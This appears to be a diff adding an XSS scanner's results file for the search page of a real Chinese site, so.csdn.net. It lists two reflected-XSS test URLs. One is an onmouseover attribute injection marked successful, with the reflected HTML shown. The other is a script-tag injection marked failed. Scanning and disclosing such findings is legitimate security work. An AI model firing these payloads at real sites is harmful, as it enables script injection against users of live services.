@@ -1,0 +1,15 @@
+ChineseLanguage/so.csdn.net
+
+https://so.csdn.net/so/search/s.do?q=' onmouseover='alert`1`&t=&u=
+Context = ATTR
+Success = TRUE
+Detection:
+b'<meta name="csdn-baidu-search" content=\'{"keyword":"\' onmouseover=\'alert`1`"}\'/>'
+
+-----------------------------------------------------------------------------------------------------
+https://so.csdn.net/so/search/s.do?q=</script><script>alert`1`</script>&t=&u=
+Context = SCRIPT
+Success = FALSE
+Detection:
+None
+-----------------------------------------------------------------------------------------------------
